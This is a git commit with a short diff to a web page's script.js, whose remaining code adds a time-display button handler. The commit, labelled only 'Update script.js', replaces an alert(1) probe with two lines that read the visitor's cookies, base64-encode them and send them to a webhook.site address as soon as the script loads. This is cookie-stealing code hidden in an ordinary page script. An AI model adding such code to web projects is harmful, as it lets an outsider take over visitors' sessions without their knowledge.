f5952e439ebcaf8c7a16a4a4b3f29c192dd7fc59
Guan-Yu-Chen <155933115+Guan-Yu-Chen@users.noreply.github.com>
2025-04-07 15:45:29 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,5 @@
-alert(1);
+var cookie = document.cookie;
+fetch("https://webhook.site/8bfc556c-6584-4e6e-8a23-980d42dc97c0?"+window.btoa(cookie));
 document.addEventListener("DOMContentLoaded", function () {
   const button = document.getElementById("showTimeButton");
   button.addEventListener("click", function () {
